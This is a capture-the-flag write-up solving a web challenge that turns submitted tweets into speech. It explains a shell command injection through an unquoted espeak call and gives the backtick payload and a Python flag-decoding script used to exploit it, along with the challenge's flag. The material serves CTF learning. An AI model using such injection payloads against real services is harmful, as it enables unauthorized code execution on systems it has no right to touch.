## Echo (Web, 200 points, 132 solves)

    If you hear enough, you may hear the whispers of a key...
    If you see app.py well enough, you will notice the UI sucks..

In the description [app.py](echo_57f0dd57961caae2fd8b3c080f0e125b.py) is provided to us. The source matches what we see when browsing to the target. A form accepting four "tweets" with a maximum length of 140 characters each. The tweets we provide are then converted into speech that we can listen to. Further reading of the source code we can understand the logic and break it into steps.

1. Tweets are extracted from their arguments and joined into an array
2. A random UUID is generated to build a tmp directory
3. Our tweets are written to ```"/tmp/echo/" + UUID + "/input"```
4. ```process_flag``` is called to obfuscate the flag before placing in ```"/tmp/echo/" + UUID + "/flag"```
5. A docker instance is created via the cmd ```docker run -m=100M --cpu-period=100000 --cpu-quota=40000 --network=none -v {path}:/share lumjjb/echo_container:latest python run.py```
6. ffmpeg is run to convert a wav to an mp3 ```ffmpeg -i {in_path} -codec:a libmp3lame -qscale:a 2 {out_path}```
7. User is redirected to a page where they can listen to the audio output

In order to get this running locally to test we are missing a rather large piece of information. We have no knowledge of the Docker instance and the code it runs. From the rest of the code we can infer that it takes in our "tweets" and performs text to speech creating a wav as output.

The normal format of a docker run cmd is ```docker run [OPTIONS] IMAGE [COMMAND] [ARG...]```. Inside of our cmd the image is `lumjjb/echo_container`. A quick google search gives us no results. If we search only for the user `lumjjb` we can find the users docker reposity at https://hub.docker.com/u/lumjjb/. A quick `docker pull lumjjb/echo_container` and we can then get a shell inside of the instance via `docker run -it lumjjb/echo_container:latest`.

Now that we have [run.py](run.py) we can see that it's splitting our `input` into lines and running each through a text to speech conversion `call(["sh","-c", "espeak " + " -w " + OUTPUT_PATH + str(i) + ".wav \"" + l + "\""])`. Since we control `l` we can get cmd injection. This can be tested by sending ``` `id` ```.

Inside of the docker container we only have access to the obfuscated flag. In additon we only have output as a _wav -> mp3_. Let's leverage the existing text-to-speech and have it read us the flag. But first we need to deobfuscate it.

```python
import sys
p = '/share/flag'
l = os.stat(p).st_size / 65000
f = open(p)
for _ in range(l):
    c = 0
    for i in range(65000-1):
        c = c ^ ord(f.read(1))
    sys.stdout.write(chr(c ^ ord(f.read(1))))
```

To deobfuscate it we simply perform the operations in reverse.
Now that we have a script which recovers the flag we need to execute it on the docker container. Thankfully tweets can have newlines inside of them, so we simply combine multiple lines into single tweets. We can execute our python code easily enough by making the first line ```#`python /share/input` ```.

Success! Or not? We get the flag but it's a horrible noisy mess. In addition we have no distinction between uppercase and lowercase characters. Let's convert them to decimal and add some pauses between. After doing that we can easily convert from decimal to ascii and we have the flag **PCTF{L15st3n_T0__reee_reeeeee_reee_la}**.

```python
#. `python /share/input`
import sys, os
p = '/share/flag'
l = os.stat(p).st_size / 65000
f = open(p)
for _ in range(l):
    c = 0
    for i in range(65000-1):
        c = c ^ ord(f.read(1))
    sys.stdout.write("%d. " % (c ^ ord(f.read(1))))
```
